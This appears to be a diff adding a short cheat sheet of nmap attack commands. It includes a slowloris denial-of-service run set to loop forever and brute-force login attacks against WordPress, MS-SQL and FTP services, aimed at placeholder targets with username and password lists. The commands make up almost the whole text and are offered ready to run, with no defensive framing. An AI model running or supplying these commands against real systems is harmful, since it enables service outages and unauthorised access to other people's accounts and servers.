@@ -1,0 +1,22 @@
+Exploit Using NMAP
+
+
+Launching a DOS attack in a forever loop(If the machine is vulnerable to slowloris)
+
+nmap <target_ip> -max-parallelism 800 -Pn --script http-slowloris --script-args http-slowloris.runforever=true
+
+
+Launching brute-force attack
+
+WordPress brute force attack:
+
+nmap -sV --script http-wordpress-brute --script-args 'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com, http-wordpress-brute.threads=3,brute.firstonly=true' 192.168.1.105
+
+Brute force attack against MS-SQL:
+
+nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt 192.168.1.105
+
+FTP brute force attack:
+
+nmap --script ftp-brute -p 21 192.168.1.105
+
